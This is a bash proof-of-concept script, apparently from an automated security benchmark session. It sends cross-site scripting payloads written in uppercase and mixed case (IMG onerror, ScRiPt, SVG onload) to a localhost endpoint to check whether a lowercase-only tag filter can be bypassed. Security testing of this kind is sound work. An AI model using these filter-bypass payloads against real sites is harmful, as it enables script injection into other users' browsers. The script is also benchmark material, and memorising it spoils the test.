#!/bin/bash
# POC: Test XSS bypass using uppercase HTML tag names against the /xss11 endpoint filter
# Target: ./repo
# Created: 2025-11-06T19:23:25.693Z
# Session: benchmark-XBEN-012-24-mhnsyuvd

# Test XSS bypass via uppercase HTML tag names on /xss11 endpoint
# This POC verifies if uppercase tags like <IMG> bypass the <[a-z/] filter

TARGET_URL="http://localhost:5000/xss11"

echo "[*] Testing XSS Filter Bypass via Uppercase HTML Tag Names"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Standard lowercase IMG tag (should be blocked)
echo "[Test 1] Lowercase <img> tag (baseline - should be blocked)"
PAYLOAD1='"><img src=x onerror="alert(1)">'
RESPONSE1=$(curl -s "$TARGET_URL" -d "search=$PAYLOAD1" 2>&1 | grep -o '<img' || echo "NOT_FOUND")
echo "Payload: $PAYLOAD1"
echo "Response contains <img: $RESPONSE1"
echo ""

# Test 2: Uppercase IMG tag (testing bypass)
echo "[Test 2] Uppercase <IMG> tag (testing bypass)"
PAYLOAD2='"><IMG src=x onerror="alert(1)">'
RESPONSE2=$(curl -s "$TARGET_URL" -d "search=$PAYLOAD2" 2>&1 | grep -o '<IMG\|<img' || echo "NOT_FOUND")
echo "Payload: $PAYLOAD2"
echo "Response contains <IMG or <img: $RESPONSE2"
echo ""

# Test 3: Mixed case SCRIPT tag
echo "[Test 3] Mixed case <ScRiPt> tag"
PAYLOAD3='"><ScRiPt>alert(1)</ScRiPt>'
RESPONSE3=$(curl -s "$TARGET_URL" -d "search=$PAYLOAD3" 2>&1 | grep -o '<[Ss][Cc][Rr][Ii][Pp][Tt]' || echo "NOT_FOUND")
echo "Payload: $PAYLOAD3"
echo "Response check: $RESPONSE3"
echo ""

# Test 4: Uppercase SVG tag
echo "[Test 4] Uppercase <SVG> tag with onload"
PAYLOAD4='"><SVG onload="alert(1)">'
RESPONSE4=$(curl -s "$TARGET_URL" -d "search=$PAYLOAD4" 2>&1 | grep -o '<SVG\|<svg' || echo "NOT_FOUND")
echo "Payload: $PAYLOAD4"
echo "Response contains <SVG or <svg: $RESPONSE4"
echo ""

# Test 5: Check actual filter output - full HTML response
echo "[Test 5] Full response analysis for uppercase IMG tag"
PAYLOAD5='"><IMG src=x onerror="alert(XSS)">'
echo "Payload: $PAYLOAD5"
FULL_RESPONSE=$(curl -s "$TARGET_URL" -d "search=$PAYLOAD5")
echo "Full HTML response (filtered):"
echo "$FULL_RESPONSE" | grep -o 'value="[^"]*"' | head -1
echo ""

# Test 6: The exact payload from the proposed finding
echo "[Test 6] Exact payload from proposed finding"
PAYLOAD6="' /><IMG src=x onerror=\"alert(String.fromCharCode(88,83,83))\""
echo "Payload: $PAYLOAD6"
FULL_RESPONSE6=$(curl -s "$TARGET_URL" -d "search=$PAYLOAD6")
echo "Full HTML response (filtered):"
echo "$FULL_RESPONSE6" | grep -o 'value="[^"]*"' | head -1
echo ""

echo "[*] Test completed"